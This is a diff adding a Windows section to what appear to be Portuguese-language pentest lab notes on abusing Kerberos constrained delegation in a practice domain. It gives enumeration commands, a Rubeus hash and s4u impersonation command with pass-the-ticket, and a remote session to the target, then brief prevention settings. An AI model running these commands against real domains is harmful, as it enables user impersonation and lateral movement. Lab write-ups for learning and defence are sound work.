@@ -20,4 +20,31 @@ Depois de desativar a Transição de Protocolo, o ataque direto falhará. A raz�
 Você precisa de uma estratégia diferente. A mais comum é usar um ataque de Delegação Baseada em Recursos Restritos (Resource-Based Constrained Delegation).
 
 
+---
 
+## Windows
+- Enumeracao com Powerview
+```Get-NetUser -TrustedToAuth```
+- Sem Powerview (nativo)
+```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```
+<img width="908" height="708" alt="wind-find-del" src="https://github.com/user-attachments/assets/fe23cabb-ddc1-4f92-a4ee-650df36ab0ed" />
+
+
+
+```Rubeus.exe hash /password:MYpassword#```
+<img width="1058" height="439" alt="hash-pass" src="https://github.com/user-attachments/assets/a1cf4c8b-4c6a-4a53-b155-d777ba9a69b0" />
+
+```.\Rubeus.exe s4u /user:fcastle /rc4:1D113F07D3425C43D4E35770BC773A95 /domain:MARVEL.local /impersonateuser:pparker /msdsspn:"cifs/SPIDERMAN" /dc:HYDRA-DC.MARVEL.local /ptt```
+
+```klist```
+<img width="1140" height="403" alt="klistspiderman" src="https://github.com/user-attachments/assets/0548ebd5-f5dd-4d99-bde5-50c1884c36e1" />
+
+```Enter-PSSession SPIDERMAN```   
+como meu usuario nao tem permisos rpivilegiados so posso listar recursos que tem acceso
+<img width="1008" height="312" alt="dir" src="https://github.com/user-attachments/assets/cda21e4d-bf6a-428d-81fc-22429e7bee37" />
+
+
+
+## Prevencao
+- Configure a propriedade A conta é confidencial e não pode ser delegada para todos os usuários privilegiados.
+- Adicione usuários privilegiados ao grupo Usuários protegidos: essa associação aplica automaticamente a proteção mencionada acima (no entanto, não é recomendável usar Usuários protegidos sem primeiro entender suas possíveis implicações).
